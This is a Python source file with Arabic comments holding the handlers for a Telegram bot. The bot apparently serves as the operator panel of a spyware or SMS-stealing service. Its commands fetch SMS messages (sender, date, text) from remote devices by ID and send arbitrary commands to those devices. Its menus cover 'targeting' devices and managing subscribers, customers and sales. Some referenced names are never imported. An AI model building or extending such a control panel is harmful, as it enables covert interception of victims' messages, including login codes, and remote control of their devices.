#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Handlers - معالجات أوامر البوت

هذا الملف يحتوي على دوال معالجة أوامر البوت وتفاعلات المستخدم.
"""

import logging
from telegram import Update, InlineKeyboardMarkup
from telegram.ext import CallbackContext

# استيراد الخدمات
from services.api_client import get_sms_data, send_command
from services.auth_service import is_authorized, is_owner, is_admin

# استيراد لوحات المفاتيح
from views.keyboards import (
    get_main_keyboard, get_owner_keyboard, get_admin_keyboard,
    OWNER_MAIN_MENU, ADMIN_MAIN_MENU, OWNER_TARGETING_MENU, ADMIN_TARGETING_MENU
)

# استيراد الرسائل
from views.messages import get_welcome_message, get_unauthorized_message

logger = logging.getLogger(__name__)


def handle_start(update: Update, context: CallbackContext) -> None:
    """معالجة أمر البدء /start"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    logger.info(f"مستخدم جديد بدأ البوت: {username} (ID: {user_id})")
    
    # التحقق من صلاحية المستخدم
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # تحديد نوع المستخدم وإرسال لوحة المفاتيح المناسبة
    if is_owner(user_id):
        keyboard = get_owner_keyboard(OWNER_MAIN_MENU)
        update.message.reply_text(
            get_welcome_message(is_owner=True),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif is_admin(user_id):
        keyboard = get_admin_keyboard(ADMIN_MAIN_MENU)
        update.message.reply_text(
            get_welcome_message(is_owner=False),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


def handle_help(update: Update, context: CallbackContext) -> None:
    """معالجة أمر المساعدة /help"""
    user_id = update.effective_user.id
    
    # التحقق من صلاحية المستخدم
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # إرسال رسالة المساعدة
    help_text = (
        "🔹 *أوامر البوت الأساسية:*\n"
        "/start - بدء البوت وعرض القائمة الرئيسية\n"
        "/help - عرض هذه المساعدة\n"
        "/get_sms - الحصول على رسائل SMS\n"
        "/send_command - إرسال أمر إلى جهاز\n\n"
        "🔸 *استخدام الأزرار:*\n"
        "يمكنك استخدام الأزرار أدناه للتنقل بين القوائم المختلفة."
    )
    
    # تحديد نوع المستخدم وإرسال لوحة المفاتيح المناسبة
    if is_owner(user_id):
        keyboard = get_owner_keyboard(OWNER_MAIN_MENU)
    else:
        keyboard = get_admin_keyboard(ADMIN_MAIN_MENU)
    
    update.message.reply_text(
        help_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


def handle_get_sms(update: Update, context: CallbackContext) -> None:
    """معالجة أمر الحصول على رسائل SMS"""
    user_id = update.effective_user.id
    
    # التحقق من صلاحية المستخدم
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # استدعاء خدمة الحصول على رسائل SMS
    try:
        # يمكن تمرير معلمات إضافية من سياق الأمر
        device_id = None
        if context.args and len(context.args) > 0:
            device_id = context.args[0]
        
        # الحصول على رسائل SMS
        sms_data = get_sms_data(device_id)
        
        if not sms_data or len(sms_data) == 0:
            update.message.reply_text("لا توجد رسائل SMS متاحة.")
            return
        
        # إرسال الرسائل للمستخدم
        for sms in sms_data:
            sms_text = f"📱 *جهاز:* {sms['device_name']}\n"
            sms_text += f"📞 *من:* {sms['sender']}\n"
            sms_text += f"🕒 *التاريخ:* {sms['date']}\n"
            sms_text += f"📝 *الرسالة:*\n{sms['message']}"
            
            update.message.reply_text(sms_text, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"خطأ في الحصول على رسائل SMS: {str(e)}")
        update.message.reply_text(f"حدث خطأ: {str(e)}")


def handle_send_command(update: Update, context: CallbackContext) -> None:
    """معالجة أمر إرسال أمر إلى جهاز"""
    user_id = update.effective_user.id
    
    # التحقق من صلاحية المستخدم
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # التحقق من وجود المعلمات المطلوبة
    if not context.args or len(context.args) < 2:
        update.message.reply_text(
            "الاستخدام الصحيح: /send_command <device_id> <command>"
        )
        return
    
    device_id = context.args[0]
    command = " ".join(context.args[1:])
    
    try:
        # إرسال الأمر إلى الجهاز
        result = send_command(device_id, command)
        
        # إرسال نتيجة التنفيذ للمستخدم
        if result.get('success'):
            update.message.reply_text(f"تم إرسال الأمر بنجاح: {command}")
        else:
            update.message.reply_text(f"فشل إرسال الأمر: {result.get('error', 'خطأ غير معروف')}")
    
    except Exception as e:
        logger.error(f"خطأ في إرسال الأمر: {str(e)}")
        update.message.reply_text(f"حدث خطأ: {str(e)}")


def handle_button_press(update: Update, context: CallbackContext) -> None:
    """معالجة الضغط على الأزرار"""
    query = update.callback_query
    user_id = query.from_user.id
    
    # التحقق من صلاحية المستخدم
    if not is_authorized(user_id):
        query.answer("غير مصرح لك باستخدام هذا البوت.")
        return
    
    # استخراج البيانات من الزر
    data = query.data
    query.answer()
    
    # معالجة الأزرار المختلفة
    if data == "main_menu":
        if is_owner(user_id):
            keyboard = get_owner_keyboard(OWNER_MAIN_MENU)
            query.edit_message_text(
                "القائمة الرئيسية للمالك",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            keyboard = get_admin_keyboard(ADMIN_MAIN_MENU)
            query.edit_message_text(
                "القائمة الرئيسية للأدمن",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
    
    # معالجة أزرار الاستهداف
    elif data == "targeting" or data == "استهداف_جهاز_محدد":
        if is_owner(user_id):
            keyboard = get_owner_keyboard(OWNER_TARGETING_MENU)
            query.edit_message_text(
                "قائمة استهداف الأجهزة",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            keyboard = get_admin_keyboard(ADMIN_TARGETING_MENU)
            query.edit_message_text(
                "قائمة استهداف الأجهزة",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
    
    # معالجة أزرار إدارة الأجهزة
    elif data == "devices" or data == "إدارة_الأجهزة":
        if is_owner(user_id):
            keyboard = get_owner_keyboard(OWNER_DEVICES_MENU)
            query.edit_message_text(
                "قائمة إدارة الأجهزة",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            # قائمة مناسبة للأدمن
            query.edit_message_text(
                "قائمة عرض الأجهزة",
                reply_markup=get_main_keyboard()
            )
    
    # معالجة باقي الأزرار
    elif data in ["إدارة_المشتركين", "إدارة_النظام", "إدارة_المبيعات", "المساعدة_والدعم",
                 "إدارة_العملاء", "الإحصائيات", "المساعدة"]:
        query.edit_message_text(
            f"تم اختيار: {data.replace('_', ' ')}",
            reply_markup=get_back_keyboard()
        )
    
    # أزرار غير معروفة
    else:
        query.edit_message_text(
            f"عذراً، هذه الميزة غير متوفرة حالياً: {data}",
            reply_markup=get_back_keyboard()
        )


def handle_text_message(update: Update, context: CallbackContext) -> None:
    """معالجة الرسائل النصية"""
    user_id = update.effective_user.id
    
    # التحقق من صلاحية المستخدم
    if not is_authorized(user_id):
        update.message.reply_text(get_unauthorized_message())
        return
    
    # معالجة الرسائل النصية المختلفة
    text = update.message.text
    
    # هنا يمكن إضافة المزيد من المنطق لمعالجة الرسائل النصية
    update.message.reply_text(f"تم استلام رسالتك: {text}")


def handle_unknown_command(update: Update, context: CallbackContext) -> None:
    """معالجة الأوامر غير المعروفة"""
    update.message.reply_text(
        "أمر غير معروف. استخدم /help للحصول على قائمة الأوامر المتاحة."
    )